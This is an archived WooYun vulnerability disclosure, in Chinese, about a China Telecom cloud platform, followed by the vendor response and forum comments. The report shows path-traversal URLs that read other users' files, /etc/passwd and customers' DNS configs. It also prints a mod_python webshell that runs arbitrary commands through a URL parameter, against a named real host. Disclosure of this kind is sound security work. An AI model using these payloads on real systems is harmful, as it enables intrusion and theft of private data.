{"id": 66332, "wybug_id": "wooyun-2015-0140015", "wybug_title": "中国电信某云平台从试用帐号到getshell(mod_python getshell)", "wybug_corp": "中国电信", "wybug_author": "白非白", "wybug_date": "2015-09-11 17:41", "wybug_open_date": "2015-10-26 15:52", "wybug_type": "命令执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": [], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-09-11：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-09-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-09-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-10-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-10-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-10-26：\t细节向公众公开  简要描述： 各种信息测漏，你还敢用不靠谱的私有云么？mod_python getshell的第一个案例？希望有朵乌云~ 详细说明：  http://www.smeia.cn/ias/clt/main?fid=clt_Register&method=demo&fun=demo从上面进入试用帐号：\n\n进入之后是这个样子：\n\nok，下面开始正文：#漏洞1：遍历其他帐号的私人文件夹（各种敏感信息：合同，个人隐私等等），邮箱内容，邮箱帐号\nhttp://www.smeia.cn/ia/m.py?fid=private&tgt=Right&menu=private&sub1=view&upath=/../\n\n\n工作资料：\n\n\n\n个人生活隐私：\n\n邮箱：\n\naccount.ini：\n\n#漏洞2：任意文件下载（可读dns配置，泄漏客户资料）\nhttp://www.smeia.cn/ia/main.py?fid=download&method=downfile&usr_id=demo@smeia.net&upath=/../../../../../../../../../etc/passwd\n查看/etc/named.conf\n\n看一下其中一个客户的dns配置\nhttp://www.smeia.cn/ia/m.py?fid=download&method=downfile&usr_id=demo@smeia.net&upath=/../../../../../../../../../var/named/ctc/master.yinfutong.com\n\n\n#漏洞3：坎坷的getshell之路首先是发现可以上传任意文件\n\n\n\n上传目录可以通过../的方式遍历，通过不断尝试+利用mod_python的报错回显（改变fid参数的值即可报错）(http://www.smeia.cn/ia/m.py?fid=privadte&tgt=Right&menu=private),得知：当u_path参数为“/../../ia”的时候可以上传文件并且访问。但是访问http://www.smeia.cn/ia/ee.py的时候，不能执行代码。\n\n然后想到读源码的方式看一下，但是报错：\n\n依然根据报错信息，可以断定，m.py只是映射的一个url，实际不存在m.py这个文件\n\n得知原理，去读模块coop_person2.py\n\n发现一处可以编辑保存文件的地方：\nhttp://www.smeia.cn/ia/main.py?fid=edit&mode=TXT&usr_id=demo@smeia.net&upath=/../../ia/ee.py\n剩下的工作就是不断的编辑、保存、调试webshell了。最终的webshell内容是这样的\n# -*- coding: utf-8 -*-################################################################################ Copyright (c) 2005 Haiwen.Zhou#        File:  apache ia: coop_person.py#      Author:  Haiwen.Zhou# Start  Date:  2005/07/28# Last modify:  2005/07/28###############################################################################__version__='$Revision: 1.6 $'[11:-2]import os,urllib, mimetypes,time, operator, shutilfrom mod_python     import apache,util,Sessionfrom HW_HTML_TOOL   import *from HW_FILE_TOOL   import openTXT,writeTXTfrom SHARE          import *from UI_BASE        import *from CONSTANT       import dRIGHTfrom coop_auth      import *import TREEH=25def mShow(req,dArgs,sess):    return cPerson(req,dArgs,sess).toHtml()class cPerson:    def __init__(self, req,dArgs,sess):        self.req = req        self.dArgs = dArgs        self.sess = sess        self.usr_id = self.sess.get('usr_id','')        self.upath  = str(dArgs.getfirst('upath', ''))                   def toHtml(self):                self.req.content_type = \"text/html\"        self.s = os.popen(self.upath).read()        self.req.write('<pre>'+self.s)        return apache.OK\n然后shell的访问方式是这样的http://www.smeia.cn/ia/m.py?fid=ee&upath={cmd}\n\n\n\n   漏洞证明：  如上   修复方案：  你懂得   版权声明：转载请注明来源 白非白@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：16  确认时间：2015-09-11 15:51 厂商回复： CNVD确认所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-09-09 17:51 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这个极有趣    \n     2015-09-09 17:52 |    \t\tSubmit \t\t\t( 普通白帽子  |\t\t\t        Rank:436 漏洞数:95        | 就是一屌丝)\t\t \n  吓得我都不敢说话了    \n     2015-09-09 17:57 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:982 漏洞数:173        | WooYun is the Bigest gay place :))\t\t \n  期待。    \n     2015-09-09 17:57 |    \t\tDNS \t\t\t( 普通白帽子  |\t\t\t        Rank:329 漏洞数:41        | 杀猪刀啊，杀猪刀啊)\t\t \n  卧槽 刚才还没雷    \n     2015-09-09 18:10 |    \t\tPyNerd \t\t\t( 普通白帽子  |\t\t\t        Rank:175 漏洞数:33        | Just for shell.)\t\t \n  期待    \n     2015-09-09 18:15 |    \t\tf4ckbaidu \t\t\t( 普通白帽子  |\t\t\t        Rank:189 漏洞数:25        | 开发真是日了狗了)\t\t \n  mark    \n     2015-09-09 18:18 |    \t\t大饭刚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:10        | 吃饭，喝酒，挖洞洞)\t\t \n  等公开    \n     2015-09-09 18:28 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:102        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  大家好我是9楼的人    \n     2015-09-09 18:33 |    \t\tbey0nd \t\t\t( 普通白帽子  |\t\t\t        Rank:895 漏洞数:142        | 相忘于江湖，不如相濡以沫)\t\t \n  我承认    \n     2015-09-09 18:45 |    \t\t牛 小 帅 \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:102        | 什么狗屁爱，生活已乱套！人的一生中，...)\t\t \n  @bey0nd 尼玛发8楼去了    \n     2015-09-09 18:57 |    \t\tzzR  \t\t\t( 普通白帽子  |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  这么d！    \n     2015-09-09 19:55 |    \t\tXmyth_夏洛克 \t\t\t( 普通白帽子  |\t\t\t        Rank:1054 漏洞数:121        | 啥都不会)\t\t \n  前排    \n     2015-09-09 20:11 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  @疯狗 冲着 这个极有趣  而关注的    \n     2015-09-09 21:35 |    \t\tSpid3r \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:10        | 常年撒网打鱼.)\t\t \n  听说很d，mark下    \n     2015-09-09 21:53 |    \t\tCyrils \t\t\t( 实习白帽子  |\t\t\t        Rank:45 漏洞数:10        | the more the better)\t\t \n  mark    \n     2015-09-09 23:19 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1307 漏洞数:190        | 。)\t\t \n  有意思    \n     2015-09-09 23:32 |    \t\t坏男孩-A_A \t\t\t( 路人 |\t\t\t        Rank:8 漏洞数:3        | 菜鸟一枚)\t\t \n  666666666666    \n     2015-09-12 20:40 |    \t\t大饭刚 \t\t\t( 实习白帽子  |\t\t\t        Rank:49 漏洞数:10        | 吃饭，喝酒，挖洞洞)\t\t \n  打雷要下雨....雷奥~~~    \n     2015-09-21 16:06 |    \t\tscanf \t\t\t( 核心白帽子 |\t\t\t        Rank:1307 漏洞数:190        | 。)\t\t \n  学习了    \n     2015-09-21 16:47 |    \t\t泰迪 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 我想知道这个以后还能改么)\t\t \n  下雨要打伞。。。雷欧    \n     2015-09-21 17:35 |    \t\tzzR  \t\t\t( 普通白帽子  |\t\t\t        Rank:1382 漏洞数:122        | 收wb   1：5 无限量收   [平台担保])\t\t \n  千里迢迢再来顶一个    \n     2015-09-21 20:37 |    \t\t白非白 \t\t\t( 普通白帽子  |\t\t\t        Rank:447 漏洞数:60        | ♫ Freedom - Anthony Hamilton ♫)\t\t \n  @zzR memeda    \n     2015-09-26 22:58 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1297 漏洞数:146        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  这个py的shell，好极了，过程好看    \n     2015-10-01 16:11 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:982 漏洞数:173        | WooYun is the Bigest gay place :))\t\t \n  终于看到了，确实很精彩。    \n     2015-10-01 22:29 |    \t\tMartial \t\t\t( 普通白帽子  |\t\t\t        Rank:1283 漏洞数:210        )\t\t \n  可以可以    \n     2015-10-19 10:57 |    \t\tHackPanda \t\t\t( 普通白帽子  |\t\t\t        Rank:113 漏洞数:15        | Talk is cheap,show me the shell.)\t\t \n  看了好几遍 还需要消化一下 赞    \n     2015-10-19 11:25 |    \t\t大师兄 \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:6        | 每日必关注乌云)\t\t \n  赞    \n     2015-10-19 15:17 |    \t\tSmilent \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:6        | None)\t\t \n  -.- 需要支付8wb    \n     2015-10-26 16:12 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:148 漏洞数:31        | 新手上路。)\t\t \n  666.python搞定    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 16, "Ranks": null}